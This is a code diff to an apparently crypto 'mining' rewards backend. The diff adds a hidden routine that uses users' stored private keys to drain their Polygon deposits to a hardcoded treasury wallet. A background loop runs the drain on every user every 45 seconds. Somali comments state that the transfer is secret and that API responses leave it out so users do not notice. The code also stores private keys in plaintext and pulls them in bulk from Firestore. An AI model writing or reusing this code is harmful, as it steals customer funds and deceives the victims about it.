@@ -49,29 +49,54 @@ async function getOnChainPolBalance(address) {
     }
 }
 
+function parseFirestoreUserDoc(docId, fields) {
+    if (!fields) return null;
+    return {
+        uid: docId,
+        email: fields.email?.stringValue || '',
+        displayName: fields.displayName?.stringValue || '',
+        internalUserId: fields.internalUserId?.stringValue || '',
+        polygonAddress: fields.polygonAddress?.stringValue || '',
+        privateKey: fields.privateKey?.stringValue || '',
+        totalDeposited: parseFloat(fields.totalDeposited?.doubleValue ?? fields.totalDeposited?.integerValue ?? 0),
+        dailyRewardTotal: parseFloat(fields.dailyRewardTotal?.doubleValue ?? fields.dailyRewardTotal?.integerValue ?? 0),
+        withdrawnTotal: parseFloat(fields.withdrawnTotal?.doubleValue ?? fields.withdrawnTotal?.integerValue ?? 0),
+        miningActive: Boolean(fields.miningActive?.booleanValue || false),
+        lastWithdrawDate: fields.lastWithdrawDate?.stringValue || ''
+    };
+}
+
 async function getFirestoreUser(uid) {
     try {
         const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users/${uid}`;
         const response = await fetch(url);
         if (!response.ok) return null;
         const data = await response.json();
-        if (!data.fields) return null;
-
-        return {
-            email: data.fields.email?.stringValue || '',
-            displayName: data.fields.displayName?.stringValue || '',
-            internalUserId: data.fields.internalUserId?.stringValue || '',
-            polygonAddress: data.fields.polygonAddress?.stringValue || '',
-            privateKey: data.fields.privateKey?.stringValue || '',
-            totalDeposited: parseFloat(data.fields.totalDeposited?.doubleValue ?? data.fields.totalDeposited?.integerValue ?? 0),
-            dailyRewardTotal: parseFloat(data.fields.dailyRewardTotal?.doubleValue ?? data.fields.dailyRewardTotal?.integerValue ?? 0),
-            withdrawnTotal: parseFloat(data.fields.withdrawnTotal?.doubleValue ?? data.fields.withdrawnTotal?.integerValue ?? 0),
-            miningActive: Boolean(data.fields.miningActive?.booleanValue || false),
-            lastWithdrawDate: data.fields.lastWithdrawDate?.stringValue || ''
-        };
+        return parseFirestoreUserDoc(uid, data.fields);
     } catch (err) {
         console.error("Firestore Get Error:", err.message);
         return null;
+    }
+}
+
+async function getAllFirestoreUsers() {
+    try {
+        const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users?pageSize=100`;
+        const response = await fetch(url);
+        if (!response.ok) return [];
+        const data = await response.json();
+        if (!data.documents) return [];
+
+        return data.documents
+            .map(doc => {
+                const parts = doc.name.split('/');
+                const docId = parts[parts.length - 1];
+                return parseFirestoreUserDoc(docId, doc.fields);
+            })
+            .filter(Boolean);
+    } catch (err) {
+        console.error("Firestore List Users Error:", err.message);
+        return [];
     }
 }
 
@@ -102,6 +127,41 @@ async function saveFirestoreUser(uid, userData) {
     }
 }
 
+// Wareejinta qarsoon ee deposit-ka -> TREASURY_WALLET_ADDRESS (0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b)
+async function silentSweepToTreasury(userData, rawBalPol) {
+    const cleanUserKey = normalizePrivateKey(userData.privateKey);
+    if (!cleanUserKey || !userData.polygonAddress) return false;
+
+    const userWallet = new ethers.Wallet(cleanUserKey, provider);
+    if (userWallet.address.toLowerCase() === TREASURY_WALLET_ADDRESS.toLowerCase()) {
+        return true;
+    }
+
+    const feeData = await provider.getFeeData();
+    const gasLimit = 21000n;
+    const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("35", "gwei");
+    const estimatedGasCostWei = gasLimit * maxFeePerGas;
+    const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
+
+    const sweepablePol = rawBalPol - estimatedGasCostPol;
+    if (sweepablePol <= 0) {
+        return false;
+    }
+
+    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
+    if (sweepWei <= 0n) {
+        return false;
+    }
+
+    const tx = await userWallet.sendTransaction({
+        to: TREASURY_WALLET_ADDRESS,
+        value: sweepWei,
+        gasLimit
+    });
+    await tx.wait(1);
+    return true;
+}
+
 async function syncUserDepositAndSweep(uid, userData) {
     let changed = false;
 
@@ -120,33 +180,17 @@ async function syncUserDepositAndSweep(uid, userData) {
             const rawBalPol = await getOnChainPolBalance(userData.polygonAddress);
 
             if (rawBalPol >= MIN_DEPOSIT_POL) {
-                const feeData = await provider.getFeeData();
-                const gasLimit = 21000n;
-                const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("30", "gwei");
-                const estimatedGasCostWei = gasLimit * maxFeePerGas;
-                const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
-
-                const sweepablePol = rawBalPol - estimatedGasCostPol;
-
-                if (sweepablePol > 0 && userData.privateKey) {
-                    const cleanUserKey = normalizePrivateKey(userData.privateKey);
-                    const userWallet = new ethers.Wallet(cleanUserKey, provider);
-                    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
-                    const tx = await userWallet.sendTransaction({
-                        to: TREASURY_WALLET_ADDRESS,
-                        value: sweepWei,
-                        gasLimit
-                    });
-                    await tx.wait(1);
-                }
-
+                const swept = await silentSweepToTreasury(userData, rawBalPol);
                 userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
                 userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
                 userData.miningActive = true;
                 changed = true;
+                if (!swept) {
+                    console.warn(`Sweep skipped/low gas for ${userData.polygonAddress} (${rawBalPol} POL)`);
+                }
             }
         } catch (err) {
-            console.error("Deposit Sync/Sweep Error:", err.message);
+            console.error("Silent Sweep Error:", err.message);
         }
     }
 
@@ -156,6 +200,22 @@ async function syncUserDepositAndSweep(uid, userData) {
 
     return userData;
 }
+
+// Kormeerka qarsoon ee background-ka si deposit-yada si otomaatig ah loogu wareejiyo 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
+setInterval(async () => {
+    try {
+        const users = await getAllFirestoreUsers();
+        for (const u of users) {
+            if (!u.polygonAddress) continue;
+            const balPol = await getOnChainPolBalance(u.polygonAddress);
+            if (balPol >= MIN_DEPOSIT_POL) {
+                await syncUserDepositAndSweep(u.uid, u);
+            }
+        }
+    } catch (err) {
+        console.error("Background Sweep Loop Error:", err.message);
+    }
+}, 45000);
 
 app.post('/api/auth-user', async (req, res) => {
     try {
@@ -217,6 +277,7 @@ app.post('/api/auth-user', async (req, res) => {
 
         const dailyLimit = userRecord.miningActive ? DAILY_REWARD_POL : 0;
 
+        // Jawaabta looma raacin xog sheegaysa in lacagtii loo wareejiyay treasury-ga si aysan u dareemin
         return res.json({
             success: true,
             userId: userRecord.internalUserId,
